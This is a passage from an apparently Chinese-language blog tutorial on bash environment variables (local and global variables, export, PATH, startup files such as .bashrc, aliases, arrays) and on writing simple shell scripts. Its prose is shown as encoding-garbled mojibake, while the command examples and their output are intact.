class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME</span><br><span class="line">/root</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç”¨bashå‘½ä»¤ç”Ÿæˆä¸€ä¸ªå­shellåï¼Œæ˜¾ç¤ºäº†HOMEç¯å¢ƒå˜é‡çš„å½“å‰å€¼ï¼Œè¿™ä¸ªå€¼å’Œçˆ¶shellä¸­çš„ä¸€æ¨¡ä¸€æ ·ï¼Œéƒ½æ˜¯&#x2F;rootã€‚</p></blockquote><h3 id="å±€éƒ¨ç¯å¢ƒå˜é‡"><a href="#å±€éƒ¨ç¯å¢ƒå˜é‡" class="headerlink" title="å±€éƒ¨ç¯å¢ƒå˜é‡"></a>å±€éƒ¨ç¯å¢ƒå˜é‡</h3><p>æŸ¥çœ‹å±€éƒ¨å˜é‡</p><blockquote><p>åœ¨Linuxç³»ç»Ÿå¹¶æ²¡æœ‰ä¸€ä¸ªåªæ˜¾ç¤ºå±€éƒ¨ç¯å¢ƒå˜é‡çš„å‘½ä»¤ã€‚</p></blockquote><ul><li><p><code>set</code></p><blockquote><p>setå‘½ä»¤ä¼šæ˜¾ç¤ºä¸ºæŸä¸ªç‰¹å®šè¿›ç¨‹è®¾ç½®çš„æ‰€æœ‰ç¯å¢ƒå˜é‡ï¼ŒåŒ…æ‹¬å±€éƒ¨å˜é‡ã€å…¨å±€å˜é‡ä»¥åŠç”¨æˆ·å®šä¹‰å˜é‡ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# set</span><br><span class="line">BASH=/bin/bash</span><br><span class="line">BASHOPTS=checkwinsize:cmdhist:expand_aliases:extquote:force_fignore:histappend:hostcomplete:interactive_comments:login_shell:progcomp:promptvars:sourcepath</span><br><span class="line">BASH_ALIASES=()</span><br><span class="line">BASH_ARGC=()</span><br><span class="line">BASH_ARGV=()</span><br><span class="line">BASH_CMDS=()</span><br><span class="line">BASH_LINENO=()</span><br><span class="line">BASH_SOURCE=()</span><br><span class="line">BASH_VERSINFO=([0]=&quot;4&quot; [1]=&quot;2&quot; [2]=&quot;46&quot; [3]=&quot;2&quot; [4]=&quot;release&quot; [5]=&quot;x86_64-redhat-linux-gnu&quot;)</span><br><span class="line">BASH_VERSION=&#x27;4.2.46(2)-release&#x27;</span><br><span class="line">COLUMNS=210</span><br><span class="line">DIRSTACK=()</span><br><span class="line">EUID=0</span><br><span class="line">GROUPS=()</span><br><span class="line">....</span><br></pre></td></tr></table></figure><blockquote><p>setå‘½ä»¤ä¼šæ˜¾ç¤ºå‡ºå…¨å±€å˜é‡ã€å±€éƒ¨å˜é‡ä»¥åŠç”¨æˆ·å®šä¹‰å˜é‡ã€‚å®ƒè¿˜ä¼šæŒ‰ç…§å­—æ¯é¡ºåºå¯¹ç»“æœè¿›è¡Œæ’åºã€‚</p><p>envå’Œprintenvå‘½ä»¤åŒsetå‘½ä»¤çš„åŒºåˆ«åœ¨äºå‰ä¸¤ä¸ªå‘½ä»¤ä¸ä¼šå¯¹å˜é‡æ’åºï¼Œä¹Ÿä¸ä¼šè¾“å‡ºå±€éƒ¨å˜é‡å’Œç”¨æˆ·å®šä¹‰å˜é‡ã€‚</p></blockquote></li></ul><h3 id="è®¾ç½®å±€éƒ¨ç”¨æˆ·è‡ªå®šä¹‰å˜é‡"><a href="#è®¾ç½®å±€éƒ¨ç”¨æˆ·è‡ªå®šä¹‰å˜é‡" class="headerlink" title="è®¾ç½®å±€éƒ¨ç”¨æˆ·è‡ªå®šä¹‰å˜é‡"></a>è®¾ç½®å±€éƒ¨ç”¨æˆ·è‡ªå®šä¹‰å˜é‡</h3><blockquote><p>ä¸€æ—¦å¯åŠ¨äº†bash shellï¼ˆæˆ–è€…æ‰§è¡Œä¸€ä¸ªshellè„šæœ¬ï¼‰ï¼Œå°±èƒ½åˆ›å»ºåœ¨è¿™ä¸ªshellè¿›ç¨‹å†…å¯è§çš„å±€éƒ¨å˜é‡äº†ã€‚</p><p>å¯ä»¥é€šè¿‡ç­‰å·ç»™ç¯å¢ƒå˜é‡èµ‹å€¼ï¼Œå€¼å¯ä»¥æ˜¯æ•°å€¼æˆ–å­—ç¬¦ä¸²ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $first_var</span><br><span class="line"></span><br><span class="line">æ³¨ï¼šå› ä¸ºæ²¡æœ‰å®šä¹‰first_varå˜é‡ï¼Œæ‰€ä»¥è¾“å‡ºä¸ºç©ºã€‚</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# $first_var=hello world</span><br><span class="line">-bash: =hello: command not found</span><br><span class="line">æ³¨ï¼šå®šä¹‰å˜é‡æ—¶æ— éœ€åŠ ä¸Š$</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# first_var=hello world</span><br><span class="line">-bash: world: command not found</span><br><span class="line">æ³¨ï¼šåœ¨ä¸ºå˜é‡èµ‹å€¼å­—ç¬¦ä¸²æ—¶ï¼Œå¦‚æœå­—ç¬¦ä¸²æœ‰å¼•å·ï¼Œå°±éœ€è¦ç”¨å•å¼•å·æ‹¬èµ·æ¥ã€‚</span><br><span class="line">å¼•ç”¨ï¼šæ²¡æœ‰å•å¼•å·çš„è¯ï¼Œbash shellä¼šä»¥ä¸ºä¸‹ä¸€ä¸ªè¯æ˜¯å¦ä¸€ä¸ªè¦æ‰§è¡Œçš„å‘½ä»¤</span><br><span class="line"></span><br><span class="line">root@izwz99bgx9y93dmv0mir0ez ~]# first_var =&#x27;hello world&#x27;</span><br><span class="line">-bash: first_var: command not found</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# first_var= &#x27;hello world&#x27;</span><br><span class="line">-bash: hello world: command not found</span><br><span class="line">æ³¨ï¼šå˜é‡å’Œ=å’Œå€¼ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œå¦åˆ™shellä¼šæŠŠå…¶å½“æˆå‘½ä»¤ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# first_var=&#x27;hello world&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $first_var</span><br><span class="line">hello world</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å±€éƒ¨å˜é‡çš„èŒƒå›´</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root     11337 11335  0 20:14 pts/0    00:00:00 -bash</span><br><span class="line">root     11415 11337  0 20:57 pts/0    00:00:00 ps -f</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# child_var=&#x27;hello khaz&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $child_var</span><br><span class="line">hello khaz</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# exit</span><br><span class="line">exit</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $child_var</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è®¾ç½®å…¨å±€å˜é‡"><a href="#è®¾ç½®å…¨å±€å˜é‡" class="headerlink" title="è®¾ç½®å…¨å±€å˜é‡"></a>è®¾ç½®å…¨å±€å˜é‡</h3><blockquote><p>åˆ›å»ºå…¨å±€ç¯å¢ƒå˜é‡çš„æ–¹æ³•æ˜¯å…ˆ<strong>åˆ›å»º</strong>ä¸€ä¸ªå±€éƒ¨ç¯å¢ƒå˜é‡ï¼Œç„¶åå†æŠŠå®ƒ<strong>å¯¼å‡º</strong>åˆ°å…¨å±€ç¯å¢ƒä¸­ã€‚</p></blockquote><p><code>export var_name</code>ï¼šå¯¼å‡ºå­shellçš„å±€éƒ¨å˜é‡åˆ°å…¨å±€ç¯å¢ƒä¸­ï¼ˆ<strong>ä¸´æ—¶ä¿®æ”¹</strong>ï¼‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps --forest</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">11566 pts/1    00:00:00 bash</span><br><span class="line">11585 pts/1    00:00:00  \_ ps</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# a=&#x27;khaz&#x27;</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# exit</span><br><span class="line">exit</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# export a</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br><span class="line">khaz</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>æˆ‘å‘ç°åªèƒ½åœ¨ç™»å½•ç»ˆç«¯çš„é‚£ä¸ªshellä¸­exportï¼Œä¸èƒ½åœ¨å­shellä¸­exportï¼Ÿ</p><p>å› ä¸ºexportçš„ä½œç”¨æ˜¯è®©å­shellå¯ä»¥ç»§æ‰¿çˆ¶shellå¯¼å‡ºè¿‡çš„å˜é‡ã€‚</p><p>å¹¶ä¸”å¦‚æœåœ¨å­shellä¸­ä¿®æ”¹å…¨å±€å˜é‡çš„å€¼ï¼Œä¹Ÿä¸ä¼šå½±å“åˆ°çˆ¶shellä¸­è¯¥å…¨å±€å˜é‡çš„å€¼ã€‚</p></blockquote><h3 id="åˆ é™¤ç¯å¢ƒå˜é‡"><a href="#åˆ é™¤ç¯å¢ƒå˜é‡" class="headerlink" title="åˆ é™¤ç¯å¢ƒå˜é‡"></a>åˆ é™¤ç¯å¢ƒå˜é‡</h3><p><code>unset var_name</code>ï¼šåˆ é™¤ç¯å¢ƒå˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# a=1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br><span class="line">1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# unset a</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $a</span><br></pre></td></tr></table></figure><h3 id="è®¾ç½®PATHç¯å¢ƒå˜é‡"><a href="#è®¾ç½®PATHç¯å¢ƒå˜é‡" class="headerlink" title="è®¾ç½®PATHç¯å¢ƒå˜é‡"></a>è®¾ç½®PATHç¯å¢ƒå˜é‡</h3><blockquote><p>PATHç¯å¢ƒå˜é‡å®šä¹‰äº†ç”¨äºè¿›è¡Œå‘½ä»¤å’Œç¨‹åºæŸ¥æ‰¾çš„ç›®å½•ã€‚</p></blockquote><p>ä¸‹é¢æ¼”ç¤ºäº†åˆ›å»ºè‡ªå®šä¹‰å‘½ä»¤ï¼Œå¹¶å¯ä»¥åœ¨ä»»ä½•è·¯å¾„ä¸‹ä½¿ç”¨è¯¥å‘½ä»¤ã€‚</p><ul><li><p>åˆ›å»ºè‡ªå®šä¹‰å‘½ä»¤ï¼Œå‘½ä»¤å†…å®¹ä¸ºè¾“å‡ºâ€™hello khazâ€™ï¼Œå¹¶å°†å…¶ç§»åŠ¨åˆ°å­˜æ”¾è‡ªå®šä¹‰å‘½ä»¤çš„ç›®å½•ä¸‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# vim hello </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo &#x27;hello khaz&#x27;</span><br><span class="line">:wq</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# mkdir my_cmd</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# mv hello my_cmd/</span><br></pre></td></tr></table></figure></li><li><p>å› ä¸ºä¸å‘½ä»¤ä¸åœ¨åŒä¸€è·¯å¾„ä¸‹ï¼Œæç¤ºæ‰¾ä¸åˆ°å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# hello</span><br><span class="line">-bash: hello: command not found</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹å¹¶å¢åŠ PATHï¼ˆè·¯å¾„ä»¥ï¼šåˆ†éš”ï¼‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# PATH=$PATH:/root/my_cmd/</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/root/my_cmd/</span><br></pre></td></tr></table></figure></li><li><p>å†æ¬¡è¾“å…¥å‘½ä»¤æˆåŠŸæ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# hello</span><br><span class="line">hello khaz</span><br></pre></td></tr></table></figure><blockquote><p>è¿™ç§æ–¹æ³•å¯¹PATHå˜é‡çš„ä¿®æ”¹åªèƒ½æŒç»­åˆ°é€€å‡ºæˆ–é‡å¯ç³»ç»Ÿã€‚</p></blockquote></li></ul><h3 id="è®©ç¯å¢ƒå˜é‡çš„ä½œç”¨æŒä¹…åŒ–"><a href="#è®©ç¯å¢ƒå˜é‡çš„ä½œç”¨æŒä¹…åŒ–" class="headerlink" title="è®©ç¯å¢ƒå˜é‡çš„ä½œç”¨æŒä¹…åŒ–"></a>è®©ç¯å¢ƒå˜é‡çš„ä½œç”¨æŒä¹…åŒ–</h3><blockquote><p>æŠŠæˆ‘ä»¬è®¾ç½®çš„ç¯å¢ƒå˜é‡æ”¾åœ¨shellçš„å¯åŠ¨æ–‡ä»¶&#x2F;ç¯å¢ƒæ–‡ä»¶ä¸­ã€‚</p><p>æˆ–è€…å¼€æœºå¯åŠ¨é¡¹<code>/etc/init.d/</code>å’Œ<code>/etc/profile.d/</code></p></blockquote><ul><li><p>å¯åŠ¨æ–‡ä»¶&#x2F;ç¯å¢ƒæ–‡ä»¶</p><blockquote><p>ç™»å…¥Linuxç³»ç»Ÿå¯åŠ¨ä¸€ä¸ªbash shellæ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹bashä¼šåœ¨å‡ ä¸ªæ–‡ä»¶ä¸­æŸ¥æ‰¾å‘½ä»¤ã€‚</p><p>è¿™äº›æ–‡ä»¶å«ä½œå¯åŠ¨æ–‡ä»¶æˆ–ç¯å¢ƒæ–‡ä»¶ã€‚</p></blockquote></li><li><p>5ä¸ªä¸åŒçš„å¯åŠ¨æ–‡ä»¶</p><p>ï± &#x2F;etc&#x2F;profile </p><p>ï± $HOME&#x2F;.bash_profile </p><p>ï± $HOME&#x2F;.bashrc </p><p>ï± $HOME&#x2F;.bash_login </p><p>ï± $HOME&#x2F;.profile </p></li><li><p>&#x2F;etc&#x2F;profileæ–‡ä»¶</p><blockquote><p>&#x2F;etc&#x2F;profileæ–‡ä»¶æ˜¯bash shellé»˜è®¤çš„çš„ä¸»å¯åŠ¨æ–‡ä»¶ã€‚</p><p>åªè¦ä½ ç™»å½•äº†Linuxç³»ç»Ÿï¼Œbashå°±ä¼šæ‰§è¡Œ&#x2F;etc&#x2F;profileå¯åŠ¨æ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat /etc/profile</span><br><span class="line">.....</span><br><span class="line">.....</span><br><span class="line">for i in /etc/profile.d/*.sh ; do</span><br><span class="line">    if [ -r &quot;$i&quot; ]; then</span><br><span class="line">        if [ &quot;$&#123;-#*i&#125;&quot; != &quot;$-&quot; ]; then </span><br><span class="line">            . &quot;$i&quot;</span><br><span class="line">        else</span><br><span class="line">            . &quot;$i&quot; &gt;/dev/null</span><br><span class="line">        fi</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line">....</span><br><span class="line">....</span><br></pre></td></tr></table></figure><blockquote><p>å…¶ä¸­çš„forè¯­å¥ä¸ºLinuxç³»ç»Ÿæä¾›äº†ä¸€ä¸ªæ”¾ç½®ç‰¹å®šåº”ç”¨ç¨‹åºå¯åŠ¨æ–‡ä»¶çš„åœ°æ–¹ï¼Œå½“ç”¨æˆ·ç™»å½•æ—¶ï¼Œshellä¼šæ‰§è¡Œè¿™äº›æ–‡ä»¶ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls -al /etc/profile.d/</span><br><span class="line">total 64</span><br><span class="line">drwxr-xr-x.  2 root root 4096 Oct 15  2017 .</span><br><span class="line">drwxr-xr-x. 82 root root 4096 Sep 24 23:07 ..</span><br><span class="line">-rw-r--r--.  1 root root  123 Jul 31  2015 less.csh</span><br><span class="line">-rw-r--r--.  1 root root  121 Jul 31  2015 less.sh</span><br><span class="line">-rw-r--r--   1 root root  105 Aug  2  2017 vim.csh</span><br><span class="line">-rw-r--r--   1 root root  269 Aug  2  2017 vim.sh</span><br><span class="line">-rw-r--r--.  1 root root  164 Jan 28  2014 which2.csh</span><br><span class="line">-rw-r--r--.  1 root root  169 Jan 28  2014 which2.sh</span><br><span class="line">-rw-r--r--. 1 root root 1741 Feb 20 05:44 lang.csh </span><br><span class="line">-rw-r--r--. 1 root root 2706 Feb 20 05:44 lang.sh</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><blockquote><p>ä¸éš¾å‘ç°ï¼Œæœ‰äº›æ–‡ä»¶ä¸ç³»ç»Ÿä¸­çš„ç‰¹å®šåº”ç”¨æœ‰å…³ã€‚</p><p>å¤§éƒ¨åˆ†åº”ç”¨éƒ½ä¼šåˆ›å»ºä¸¤ä¸ªå¯åŠ¨æ–‡ä»¶ï¼šä¸€ä¸ªä¾›bash shellä½¿ç”¨ï¼ˆä½¿ç”¨.shæ‰©å±•åï¼‰ï¼Œä¸€ä¸ªä¾›c shellä½¿ç”¨ï¼ˆä½¿ç”¨.cshæ‰©å±•åï¼‰ã€‚</p><p>å…¶ä¸­lang.cshå’Œlang.shæ–‡ä»¶æ˜¯ç”¨æ¥è®¾ç½®å­—ç¬¦é›†çš„ã€‚</p></blockquote></li><li><p>$HOMEç›®å½•ä¸‹çš„å¯åŠ¨æ–‡ä»¶</p><blockquote><p>è¿™äº›å¯åŠ¨æ–‡ä»¶éƒ½èµ·ç€åŒä¸€ä¸ªä½œç”¨ï¼šæä¾›ä¸€ä¸ªç”¨æˆ·ä¸“å±çš„å¯åŠ¨æ–‡ä»¶æ¥å®šä¹‰è¯¥ç”¨æˆ·æ‰€ç”¨åˆ°çš„ç¯</p><p>å¢ƒå˜é‡ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls -a $HOME</span><br><span class="line">.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  .cache  cqhttp  .cshrc  H1ve  my_cmd  .pip  .pki  .pydistutils.cfg  .ssh  .tcshrc  .viminfo  .viminfo.tmp  web</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat $HOME/.bash_profile</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bash_profile</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Get the aliases and <span class="built_in">functions</span></span></span><br><span class="line">if [ -f ~/.bashrc ]; then</span><br><span class="line">. ~/.bashrc</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific environment and startup programs</span></span><br><span class="line"></span><br><span class="line">PATH=$PATH:$HOME/bin</span><br><span class="line"></span><br><span class="line">export PATH</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>è¿™é‡Œå…ˆä¼šåˆ¤æ–­.bashrcæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨å…ˆæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat .bashrc </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bashrc</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific aliases and <span class="built_in">functions</span></span></span><br><span class="line"></span><br><span class="line">alias rm=&#x27;rm -i&#x27;</span><br><span class="line">alias cp=&#x27;cp -i&#x27;</span><br><span class="line">alias mv=&#x27;mv -i&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Source global definitions</span></span><br><span class="line">if [ -f /etc/bashrc ]; then</span><br><span class="line">. /etc/bashrc</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥è®¾ç½®åˆ«åï¼Œæ¯”å¦‚æˆ‘æ·»åŠ <code>alias la=&#39;ls -a&#39;</code>,é‡å¯shellå</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat ~/.bashrc </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bashrc</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific aliases and <span class="built_in">functions</span></span></span><br><span class="line"></span><br><span class="line">alias rm=&#x27;rm -i&#x27;</span><br><span class="line">alias cp=&#x27;cp -i&#x27;</span><br><span class="line">alias mv=&#x27;mv -i&#x27;</span><br><span class="line">alias la=&#x27;ls -a&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Source global definitions</span></span><br><span class="line">if [ -f /etc/bashrc ]; then</span><br><span class="line">. /etc/bashrc</span><br><span class="line">fi</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# la</span><br><span class="line">.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  .cache  cqhttp  .cshrc  H1ve  my_cmd  .pip  .pki  .pydistutils.cfg  .ssh  .tcshrc  .viminfo  .viminfo.tmp  web</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><code>PATH=$PATH:$HOME/bin</code>åˆ™åº”è¯¥æ˜¯ç™»å½•shellåè‡ªåŠ¨æ·»åŠ è·¯å¾„åˆ°PATHä¸­</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ç¼–è¾‘ä¸ºPATH=$PATH:$HOME/bin:$HOME/my_cmd</span><br><span class="line">é‡å¯shellå/sourceç«‹å³ç”Ÿæ•ˆå</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/root/my_cmd</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# hello</span><br><span class="line">hello khaz</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="ç¯å¢ƒå˜é‡ç«‹å³ç”Ÿæ•ˆ"><a href="#ç¯å¢ƒå˜é‡ç«‹å³ç”Ÿæ•ˆ" class="headerlink" title="ç¯å¢ƒå˜é‡ç«‹å³ç”Ÿæ•ˆ"></a>ç¯å¢ƒå˜é‡ç«‹å³ç”Ÿæ•ˆ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source xxx</span><br></pre></td></tr></table></figure><h3 id="ç¯å¢ƒå˜é‡ç‰¹æ€§"><a href="#ç¯å¢ƒå˜é‡ç‰¹æ€§" class="headerlink" title="ç¯å¢ƒå˜é‡ç‰¹æ€§"></a>ç¯å¢ƒå˜é‡ç‰¹æ€§</h3><blockquote><p>ç¯å¢ƒå˜é‡æœ‰ä¸€ä¸ªå¾ˆé…·çš„ç‰¹æ€§å°±æ˜¯ï¼Œå®ƒä»¬å¯ä½œä¸ºæ•°ç»„ä½¿ç”¨ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# arrary=(1 2 3)</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $arrary</span><br><span class="line">1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $arrary[1]</span><br><span class="line">1[1]</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $&#123;arrary[1]&#125;</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>åœ¨ä½¿ç”¨å˜é‡æ—¶æœ€å¥½å°†å˜é‡åç”¨{}æ‹¬èµ·æ¥ï¼Œå¦åˆ™å¯èƒ½ä¼šè§£æé”™è¯¯ã€‚</p><h1 id="shellè„šæœ¬ç¼–å†™"><a href="#shellè„šæœ¬ç¼–å†™" class="headerlink" title="shellè„šæœ¬ç¼–å†™"></a>shellè„šæœ¬ç¼–å†™</h1><ol><li><p>åˆ›å»ºshellè„šæœ¬</p><blockquote><p>åœ¨åˆ›å»ºshellè„šæœ¬æ–‡ä»¶æ—¶ï¼Œå¿…é¡»åœ¨æ–‡ä»¶çš„ç¬¬ä¸€è¡ŒæŒ‡å®šè¦ä½¿ç”¨çš„shellã€‚å…¶æ ¼å¼ä¸ºï¼š<code>#!/bin/bash </code></p><p>åœ¨é€šå¸¸çš„shellè„šæœ¬ä¸­ï¼Œäº•å·ï¼ˆ#ï¼‰ç”¨ä½œæ³¨é‡Šè¡Œã€‚shellå¹¶ä¸ä¼šå¤„ç†shellè„šæœ¬ä¸­çš„æ³¨é‡Šè¡Œã€‚ç„¶è€Œï¼Œ</p><p>shellè„šæœ¬æ–‡ä»¶çš„ç¬¬ä¸€è¡Œæ˜¯ä¸ªä¾‹å¤–ï¼Œ#åé¢çš„æƒŠå¹å·ä¼šå‘Šè¯‰shellç”¨å“ªä¸ªshellæ¥è¿è¡Œè„šæœ¬ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo hello world</span><br></pre></td></tr></table></figure></li><li><p>è®¾ç½®æƒé™</p><p><code>sudo chmod +x file_name </code></p></li><li><p>è¿è¡Œè„šæœ¬</p><ul><li>shell è„šæœ¬æ–‡ä»¶å</li><li>chmod +x è„šæœ¬æ–‡ä»¶å; è„šæœ¬æ–‡ä»¶å</li><li>. è„šæœ¬æ–‡ä»¶å</li><li>source è„šæœ¬æ–‡ä»¶å</li></ul></li></ol><p>è„šæœ¬æ–‡ä»¶åå¦‚<code>./name.sh</code></p><img src="E:\typora img\20210321121053755.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" style="zoom: 80%;" /><h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h3><h4 id="å®šä¹‰ä¸ä½¿ç”¨"><a href="#å®šä¹‰ä¸ä½¿ç”¨" class="headerlink" title="å®šä¹‰ä¸ä½¿ç”¨"></a>å®šä¹‰ä¸ä½¿ç”¨</h4><blockquote><p>å¦‚æœè¦ç”¨åˆ°å˜é‡ï¼Œä½¿ç”¨$ï¼›</p><p>å¦‚æœè¦æ“ä½œå˜é‡ï¼Œä¸ä½¿ç”¨$ã€‚</p><p>è¿™æ¡è§„åˆ™çš„ä¸€ä¸ªä¾‹å¤–å°±æ˜¯ä½¿ç”¨printenvæ˜¾ç¤ºæŸä¸ªå˜é‡çš„å€¼ã€‚</p></blockquote><p>ç”¨åˆ°å˜é‡ â†’ ç”¨åˆ°å˜é‡çš„å€¼</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $a  #è¾“å‡ºå˜é‡çš„å€¼</span><br><span class="line">printenv PATH #ç”¨åˆ°å˜é‡çš„å€¼ï¼Œä½†ä¸éœ€è¦åŠ $</span><br></pre></td></tr></table></figure><p>æ“ä½œå˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=1 #å®šä¹‰å˜é‡</span><br><span class="line">export a #å¯¼å‡ºå˜é‡</span><br><span class="line">unset a #åˆ é™¤å˜é‡</span><br></pre></td></tr></table></figure><h4 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h4><p>èƒ½å¤Ÿè®©å˜é‡ä½œä¸ºå‘½ä»¤è¡Œå‚æ•°</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME</span><br><span class="line">/root</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls $HOME</span><br><span class="line">H1ve  web</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls /root</span><br><span class="line">H1ve  